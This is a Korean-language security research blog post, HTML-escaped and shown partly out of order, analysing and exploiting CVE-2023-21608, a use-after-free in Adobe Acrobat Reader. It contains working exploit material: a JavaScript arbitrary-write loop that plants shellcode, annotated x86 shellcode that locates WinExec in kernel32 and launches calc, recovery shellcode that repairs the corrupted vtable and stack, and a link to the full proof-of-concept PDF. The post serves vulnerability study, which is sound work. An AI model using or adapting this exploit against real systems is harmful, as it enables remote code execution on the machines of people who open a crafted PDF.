    &lt;span class=&#34;hljs-number&#34;&gt;469892611&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1018101719&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2425393296&lt;/span&gt;,

    &lt;span class=&#34;hljs-comment&#34;&gt;// recovery suffix&lt;/span&gt;
    &lt;span class=&#34;hljs-comment&#34;&gt;// 0x909090CC,&lt;/span&gt;
    &lt;span class=&#34;hljs-comment&#34;&gt;/*restore regs*/&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x58585d58&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;/*restore vtable*/&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x8b48608b&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x50648911&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;/*pop regs*/&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x5f5e5a5b&lt;/span&gt;,
    &lt;span class=&#34;hljs-comment&#34;&gt;/*restore ebp,esp: 0x89ea83ea, 0x3089d490, */&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x89ec83ec&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x30909090&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;/* esi = fn*/&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x8b706890&lt;/span&gt;,
    &lt;span class=&#34;hljs-comment&#34;&gt;/*arrbuf restore*/&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x53bb4000&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x00208b50&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x6cc7430c&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xe8ff0000&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xc74220e8&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xff000090&lt;/span&gt;,
    &lt;span class=&#34;hljs-number&#34;&gt;0x8953108b&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x50708913&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x8b507489&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x530431d2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x5b909090&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;/*jmp esi*/&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0xffe69090&lt;/span&gt;
    &lt;span class=&#34;hljs-comment&#34;&gt;/*jmp defaultVal 0xff606890*/&lt;/span&gt;
];

&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; shellcode.length; i++) AAW(arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x400&lt;/span&gt; + i * &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, re(shellcode[i]));&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC0BD;&amp;#xC785;&amp;#xB41C; shellcode&amp;#xB97C; &amp;#xB514;&amp;#xC2A4;&amp;#xC5B4;&amp;#xC148;&amp;#xBE14;&amp;#xD55C; &amp;#xACB0;&amp;#xACFC;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;89e0           mov     eax, esp
83e818         sub     eax, 18h
53             push    ebx
52             push    edx
56             push    esi
57             push    edi
50             push    eax
55             push    ebp
90             nop     
31d2           xor     edx, edx
52             push    edx; 0
6863616c63     push    636C6163h; &amp;quot;calc&amp;quot;
54             push    esp
59             pop     ecx
52             push    edx
51             push    ecx
648b7230       mov     esi, dword ptr fs:[edx+30h]; PEB
8b760c         mov     esi, dword ptr [esi+0Ch]; PEB_LDR_DATA
8b760c         mov     esi, dword ptr [esi+0Ch]; InLoadOrderModuleList
ad             lods    dword ptr [esi]; eax &amp;lt;- AcroRd32.exe&amp;apos;s _LDR_DATA_TABLE_ENTRY
8b30           mov     esi, dword ptr [eax]; esi &amp;lt;- KERNEL32.dll&amp;apos;s _LDR_DATA_TABLE_ENTRY
8b7e18         mov     edi, dword ptr [esi+18h]; edi &amp;lt;- KERNEL32 dll base
8b5f3c         mov     ebx, dword ptr [edi+3Ch]; ebx &amp;lt;- PE Headaer Offset
8b5c1f78       mov     ebx, dword ptr [edi+ebx+78h]; ebx &amp;lt;- Export Table Offset
8b741f20       mov     esi, dword ptr [edi+ebx+20h]; esi &amp;lt;- Name Pointer Table offset
01fe           add     esi, edi; add KERNEL32 base to esi(Name Pointer Table addr)
8b541f24       mov     edx, dword ptr [edi+ebx+24h]; edx &amp;lt;- Ordinal Table Offset
0fb72c17       movzx   ebp, word ptr [edi+edx]; ebp &amp;lt;- Ordinal Number
42             inc     edx
42             inc     edx; move to next
ad             lods    dword ptr [esi]; Function name offset
813c0757696e45 cmp     dword ptr [edi+eax], 456E6957h; compare Function_Name with &amp;quot;WinE&amp;quot;
75f0           jne     20000491; if WinExec Found, no jump
8b741f1c       mov     esi, dword ptr [edi+ebx+1Ch]; esi &amp;lt;- Address Table Offset
01fe           add     esi, edi; esi &amp;lt;- Address Table addr
033cae         add     edi, dword ptr [esi+ebp*4]; edi &amp;lt;- edi(KERNEL32 base) + WinExec Offset
ffd7           call    edi; WinExec(&amp;quot;calc&amp;quot;, 0)&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC774;&amp;#xB294; &lt;code&gt;WinExec(&amp;quot;calc&amp;quot;, 0)&lt;/code&gt;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; Windows x86 &amp;#xB300;&amp;#xC0C1; Universal Shellcode&amp;#xB85C; &amp;#xACC4;&amp;#xC0B0;&amp;#xAE30; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC744; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xC5EC; RCE &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC744; &amp;#xC99D;&amp;#xBA85;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9;&amp;#xC73C;&amp;#xB85C; &lt;code&gt;WinExec&lt;/code&gt;&amp;#xAC00; &amp;#xB9AC;&amp;#xD134;&amp;#xD55C; &amp;#xB2E4;&amp;#xC74C;&amp;#xC5D0;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC740; shellcode&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xC5B4; shellcode&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB41C; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xB97C; &amp;#xBCF5;&amp;#xAD6C;&amp;#xD558;&amp;#xACE0; &amp;#xBCC0;&amp;#xC870;&amp;#xB41C; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xC758; length, &lt;code&gt;f0&lt;/code&gt;&amp;#xC758; vtable &amp;#xC8FC;&amp;#xC18C;,  pivot&amp;#xB41C; &amp;#xC2A4;&amp;#xD0DD; &amp;#xB4F1;&amp;#xC744; &amp;#xBCF5;&amp;#xC6D0;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xD6C4; &amp;#xC0AC;&amp;#xC804;&amp;#xC5D0; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD574;&amp;#xB454; &lt;code&gt;defaultValue&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C; &lt;code&gt;jmp&lt;/code&gt;&amp;#xD558;&amp;#xC5EC; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC774; &amp;#xC131;&amp;#xACF5;&amp;#xD55C; &amp;#xD6C4;&amp;#xC5D0;&amp;#xB3C4; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC5D0;&amp;#xC11C; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xAC8C; &amp;#xB9CC;&amp;#xB4ED;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;200004b0 58             pop     eax
200004b1 58             pop     eax
200004b2 5d             pop     ebp
200004b3 58             pop     eax
200004b4 8b4860         mov     ecx, dword ptr [eax+60h]
200004b7 8b5064         mov     edx, dword ptr [eax+64h]
200004ba 8911           mov     dword ptr [ecx], edx
200004bc 5f             pop     edi
200004bd 5e             pop     esi
200004be 5a             pop     edx
200004bf 5b             pop     ebx
200004c0 89ec           mov     esp, ebp
200004c2 83ec30         sub     esp, 30h
200004c5 90             nop     
200004c6 90             nop     
200004c7 90             nop     
200004c8 8b7068         mov     esi, dword ptr [eax+68h]
200004cb 90             nop     
200004cc 53             push    ebx
200004cd bb40000020     mov     ebx, 20000040h
200004d2 8b506c         mov     edx, dword ptr [eax+6Ch]
200004d5 c7430ce8ff0000 mov     dword ptr [ebx+0Ch], 0FFE8h
200004dc c74220e8ff0000 mov     dword ptr [edx+20h], 0FFE8h
200004e3 90             nop     
200004e4 895310         mov     dword ptr [ebx+10h], edx
200004e7 8b5070         mov     edx, dword ptr [eax+70h]
200004ea 8913           mov     dword ptr [ebx], edx
200004ec 8b5074         mov     edx, dword ptr [eax+74h]
200004ef 895304         mov     dword ptr [ebx+4], edx
200004f2 31d2           xor     edx, edx
200004f4 5b             pop     ebx
200004f5 90             nop     
200004f6 90             nop     
200004f7 90             nop     
200004f8 ffe6           jmp     esi&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ROP &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xC640; Shellcode&amp;#xC758; &amp;#xC2E4;&amp;#xD589;&amp;#xC740; &amp;#xC544;&amp;#xB798;&amp;#xC758; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;f0&lt;/code&gt;&amp;#xC758; Fake vtable&amp;#xC758; &lt;code&gt;defaultValue&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xC5D0; &amp;#xD574;&amp;#xB2F9;&amp;#xD558;&amp;#xB294; &lt;code&gt;sub_20EFAA60&lt;/code&gt;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC73C;&amp;#xB85C; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9D1;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB610;&amp;#xD55C; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC; &amp;#xB4F1; &amp;#xC758;&amp;#xB3C4;&amp;#xCE58; &amp;#xC54A;&amp;#xC740; &amp;#xB3D9;&amp;#xC791;&amp;#xC744; &amp;#xBC29;&amp;#xC9C0;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &amp;#xBCC0;&amp;#xC870;&amp;#xD55C; &lt;code&gt;targetStr&lt;/code&gt;&amp;#xACFC; &lt;code&gt;targetDV&lt;/code&gt;&amp;#xB97C; &amp;#xC6D0;&amp;#xB798;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C; &amp;#xBCF5;&amp;#xC6D0;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;corruptedTypedArr[arrStart + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;] = originalTargetStrAddr;
&lt;span class=&#34;hljs-comment&#34;&gt;//corruptedTypedArr[FAKE_DV_START+20] = originalDVBackingStore;&lt;/span&gt;
corruptedTypedArr[arrStart + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;] = originalTargetDVAddr;

&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; x = f0.defaultValue;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC804;&amp;#xCCB4; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xCF54;&amp;#xB4DC;&amp;#xB294; &lt;a href=&#34;https://github.com/hacksysteam/CVE-2023-21608&#34;&gt;Reference&lt;/a&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xACE0; &lt;code&gt;exploit.pdf&lt;/code&gt;&amp;#xC5D0;&amp;#xB294; &amp;#xD574;&amp;#xB2F9; JavaScript &amp;#xCF54;&amp;#xB4DC;&amp;#xAC00; &amp;#xC784;&amp;#xBCA0;&amp;#xB4DC;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC5B4; &amp;#xCDE8;&amp;#xC57D;&amp;#xD55C; &amp;#xBC84;&amp;#xC804;&amp;#xC758; Acrobat&amp;#xC774;&amp;#xB098; Acrobat Reader&amp;#xB85C; &amp;#xC5F4; &amp;#xACBD;&amp;#xC6B0; &amp;#xC704; &amp;#xACFC;&amp;#xC815;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; RCE&amp;#xAC00; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9D1;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB4DC;&amp;#xB514;&amp;#xC5B4;!&amp;#x2026; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC774; &amp;#xB05D;&amp;#xB0AC;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026; &amp;#xC790;&amp;#xBC14;&amp;#xC2A4;&amp;#xD06C;&amp;#xB9BD;&amp;#xD2B8;&amp;#xB294; &amp;#xC815;&amp;#xB9D0; &amp;#xC27D;&amp;#xC9C0; &amp;#xC54A;&amp;#xB124;&amp;#xC694;&amp;#x2026; &amp;#xC2DC;&amp;#xC5F0; &amp;#xB370;&amp;#xBAA8;&amp;#xAE4C;&amp;#xC9C0;&amp;#xB9CC; &amp;#xBCF4;&amp;#xC5EC;&amp;#xB4DC;&amp;#xB9AC;&amp;#xACE0; &amp;#xB9C8;&amp;#xCE58;&amp;#xB3C4;&amp;#xB85D;&amp;#xD558;&amp;#xC8E0;!&lt;/p&gt;
&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;https://www.youtube.com/embed/f3RObd6h2qw?si=l7WAeyWgGJ_MuCWp&#34; title=&#34;YouTube video player&#34; frameborder=&#34;0&#34; allow=&#34;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&#34; referrerpolicy=&#34;strict-origin-when-cross-origin&#34; allowfullscreen&gt;&lt;/iframe&gt;

&lt;h1 id=&#34;Fini&#34;&gt;&lt;a href=&#34;#Fini&#34; class=&#34;headerlink&#34; title=&#34;Fini&#34;&gt;&lt;/a&gt;Fini&lt;/h1&gt;&lt;p&gt;&amp;#xC790;&amp;#xBC14;&amp;#xC2A4;&amp;#xD06C;&amp;#xB9BD;&amp;#xD2B8;&amp;#xC640; &amp;#xAD00;&amp;#xB828;&amp;#xB41C; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC740; &amp;#xCC98;&amp;#xC74C;&amp;#xC774;&amp;#xC5C8;&amp;#xB294;&amp;#xB370; &amp;#xC815;&amp;#xB9D0; &amp;#xC27D;&amp;#xC9C0; &amp;#xC54A;&amp;#xB124;&amp;#xC694;&amp;#x2026; &amp;#xC774;&amp;#xB7F0; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC744; &amp;#xB9C8;&amp;#xAD6C; &amp;#xCC3E;&amp;#xB294; &amp;#xC0AC;&amp;#xB78C;&amp;#xB4E4;&amp;#xC740; &amp;#xB300;&amp;#xCCB4; &amp;#xBB50;&amp;#xD558;&amp;#xB294; &amp;#xC0AC;&amp;#xB78C;&amp;#xB4E4;&amp;#xC77C;&amp;#xAE4C; &amp;#xC2F6;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4; &amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B; &amp;#xCC38;&amp;#xACE0;&amp;#xD560;&amp;#xB9CC;&amp;#xD55C; &amp;#xC88B;&amp;#xC740; &amp;#xB808;&amp;#xD37C;&amp;#xB7F0;&amp;#xC2A4;&amp;#xAC00; &amp;#xC788;&amp;#xC5B4;&amp;#xC11C; &amp;#xC27D;&amp;#xAC8C;?&amp;#x2026; &amp;#xBD84;&amp;#xC11D;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xB294;&amp;#xB370; &amp;#xD328;&amp;#xCE58; &amp;#xBD84;&amp;#xC11D; &amp;#xB0B4;&amp;#xC6A9;&amp;#xC740; &amp;#xC5C6;&amp;#xC5B4;&amp;#xC11C; &amp;#xC9C1;&amp;#xC811; &amp;#xBD84;&amp;#xC11D;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74;&amp;#xC11C; &amp;#xC7AC;&amp;#xBC0C;&amp;#xAE30;&amp;#xB3C4; &amp;#xD588;&amp;#xACE0;&amp;#xC694; &amp;#xC2DC;&amp;#xAC04;&amp;#xB9CC; &amp;#xC788;&amp;#xB2E4;&amp;#xBA74; &amp;#xC55E;&amp;#xC73C;&amp;#xB85C;&amp;#xB3C4; &amp;#xC774;&amp;#xB7F0; &amp;#xAE00; &amp;#xB9CE;&amp;#xC774; &amp;#xC368;&amp;#xBCF4;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;h1 id=&#34;Reference&#34;&gt;&lt;a href=&#34;#Reference&#34; class=&#34;headerlink&#34; title=&#34;Reference&#34;&gt;&lt;/a&gt;Reference&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://hacksys.io/blogs/adobe-reader-resetform-cagg-rce-cve-2023-21608&#34;&gt;https://hacksys.io/blogs/adobe-reader-resetform-cagg-rce-cve-2023-21608&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/hacksysteam/CVE-2023-21608&#34;&gt;https://github.com/hacksysteam/CVE-2023-21608&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
 - hack &amp; life">
  <meta property="og:image" content="https://hackyboiz.github.io/2024/08/04/pwndorei/1day1document_CVE-2023-21608/1day1document.jpg">
  <meta property="og:url" content="https://hackyboiz.github.io/">

  <link rel="canonical" href="https://hackyboiz.github.io/2024/08/04/pwndorei/1day1document_cve-2023-21608/">

  <title>[Research] 1day1document : CVE-2023-21608 - hackyboiz</title>

  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">


  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
  <link rel="stylesheet" href="/lib/hint/hint.min.css">

  
    
    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css">
  

  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_6peoq002giu.css">
<link rel="stylesheet" href="/.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
<link rel="stylesheet" href="/.css">


<link rel="stylesheet" href="/css/main.css">

<!-- 自定义样式保持在最底部 -->


  <script src="/js/utils.js"></script>
  <script src="/js/color-schema.js"></script>

<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
</head>


<body>
  <header style="height: 40vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">&nbsp;<strong>Hackyboiz</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-addrcard"></i>
                About
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/author/">
                <i class="iconfont icon-user-fill"></i>
                Author
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax="true" style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              
  <div class="mt-3 post-meta">
    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
    <time datetime="2024-08-04 17:00" pubdate>
      2024년 8월 4일 오후
    </time>
  </div>


<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      11.3k 자
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      225
       분
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2">
      <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
    </div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">[Research] 1day1document : CVE-2023-21608</h1>
                       
            <div class="markdown-body" id="post-body">
              <!-- <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
              <!-- hackyboiz_horizen_index -->
              <!--
              <ins class="adsbygoogle"
                   style="display:block"
                   data-ad-client="ca-pub-3672652207808168"
                   data-ad-slot="8887862313"
                   data-ad-format="auto"
                   data-full-width-responsive="true"></ins>
              <script>
                   (adsbygoogle = window.adsbygoogle || []).push({});
              </script>
              -->
              <h1 id="Init"><a href="#Init" class="headerlink" title="Init"></a>Init</h1><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! pwndorei&#xC785;&#xB2C8;&#xB2E4;. &#xC624;&#xB298;&#xC740; &#xC624;&#xB79C;&#xB9CC;&#xC5D0; &#xC5F0;&#xAD6C;&#xAE00;&#xB85C; &#xB3CC;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;!</p>
<p>&#xC774;&#xBC88; &#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xC81C;&#xBAA9;&#xCC98;&#xB7FC; CVE-2023-21608&#xC758; &#xBD84;&#xC11D; &#xBC0F; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xACFC;&#xC815;&#xC744; &#xB2E4;&#xB8F0; &#xAC83;&#xC774;&#xACE0; &#xD558;&#xB8E8;&#xD55C;&#xC904;&#xC5D0; &#xC880; &#xBD80;&#xC871;&#xD568;&#xC744; &#xB290;&#xB07C;&#xC168;&#xC744; &#xBD84;&#xB4E4;&#xC744; &#xC704;&#xD55C; &#xD558;&#xB8E8; &#xD55C; &#xBB38;&#xC11C;&#xCBE4; &#xB418;&#xB294; &#xBD84;&#xB7C9;&#xC785;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B;&#x314B;</p>
<p><img src="/2024/08/04/pwndorei/1day1document_CVE-2023-21608/8yf1gt.gif" srcset="/img/loading.gif" alt="8yf1gt.gif"></p>
<h1 id="1-&#xCDE8;&#xC57D;&#xC810;-&#xC815;&#xBCF4;"><a href="#1-&#xCDE8;&#xC57D;&#xC810;-&#xC815;&#xBCF4;" class="headerlink" title="1. &#xCDE8;&#xC57D;&#xC810; &#xC815;&#xBCF4;"></a>1. &#xCDE8;&#xC57D;&#xC810; &#xC815;&#xBCF4;</h1><hr>
<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>CVE-2023-21608&#xC740; Adobe &#xC0AC;&#xC758; PDF &#xBB38;&#xC11C; &#xD3B8;&#xC9D1;, &#xBCC0;&#xD658; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC778; Acrobat&#xACFC; PDF &#xBDF0;&#xC5B4;&#xC778; Acrobat Reader &#xC81C;&#xD488;&#xAD70;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; Use-After-Free &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xC544;&#xB798;&#xC758; &#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC758; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xB4E4;&#xC5D0;&#xC11C; &#xC545;&#xC131; PDF &#xBB38;&#xC11C;&#xB97C; &#xC5F4;&#xBA74; &#xBB38;&#xC11C;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; Javascript &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA74;&#xC11C; Use-After-Free&#xAC00; &#xD2B8;&#xB9AC;&#xAC70;&#xB418;&#xACE0; &#xC774;&#xB97C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xD558;&#xC5EC; Remote Code Execution&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>
<h2 id="Affected-Product-amp-Version-Information"><a href="#Affected-Product-amp-Version-Information" class="headerlink" title="Affected Product &amp; Version Information"></a>Affected Product &amp; Version Information</h2><ul>
<li>Adobe Acrobat 2020<ul>
<li>version &#x2264; 20.005.30418</li>
</ul>
</li>
<li>Adobe Acrobat Reader 2020<ul>
<li>version &#x2264; 20.005.30418</li>
</ul>
</li>
<li>Acrobat DC<ul>
<li>version &#x2264; 22.003.20282</li>
</ul>
</li>
<li>Acrobat Reader DC<ul>
<li>version &#x2264;  22.003.20282</li>
</ul>
</li>
</ul>
<p>&#xC81C; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xBD84;&#xC11D;&#xACFC; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xC704;&#xD574; Adobe Acrobat Reader DC x86&#xC758; 2022.001.20085 &#xBC84;&#xC804;&#xC744; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;!</p>
<h1 id="2-&#xCDE8;&#xC57D;&#xC810;-&#xBD84;&#xC11D;"><a href="#2-&#xCDE8;&#xC57D;&#xC810;-&#xBD84;&#xC11D;" class="headerlink" title="2. &#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D;"></a>2. &#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D;</h1><hr>
<p>&#xBA3C;&#xC800; &#xC544;&#xB798;&#xB294; Use-After-Free&#xB97C; &#xC720;&#xBC1C;&#xD558;&#xC5EC; &#xD06C;&#xB798;&#xC2DC;&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xB294;&#xB370; &#xC0AC;&#xC6A9;&#xB41C; Javascript &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs jsx"><span class="hljs-keyword">var</span> testField = <span class="hljs-built_in">this</span>.getField(<span class="hljs-string">&quot;testField&quot;</span>);

testField.richText = <span class="hljs-literal">true</span>;

